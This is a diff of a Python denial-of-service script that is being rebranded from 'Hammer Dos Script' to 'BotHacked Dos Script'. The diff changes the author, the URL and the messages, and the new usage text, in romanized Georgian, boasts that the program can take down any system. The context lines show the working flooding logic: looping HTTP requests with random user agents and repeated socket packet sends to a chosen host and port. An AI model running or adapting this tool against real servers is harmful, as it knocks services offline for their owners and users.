@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
+# python 3.3.2+ BotHacked Dos Script v.1
+# by X:xUzManN/A/
 # only for legal purpose
 
 
@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mbot is Hacked By X:xUzManN/A/...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Paketebi igzavneba ! BotHacked ---> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -75,13 +75,13 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+	print (''' \033[92m	BotHacked Dos Script v.1 http://www.GeoHackTeam.Ge/
+	tqven Shegidzliat yvelanairi sistema gatishot am programit.
+	amisatvis miutitet rogrc ari qvesh mocemuli. \n
+	magalitad : ./bothacked.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
-	-p : port default 80
+	-p : port 80
 	-t : turbo default 135 \033[0m''')
 	sys.exit()
 
@@ -139,7 +139,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mMiutitet ipi da porti\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
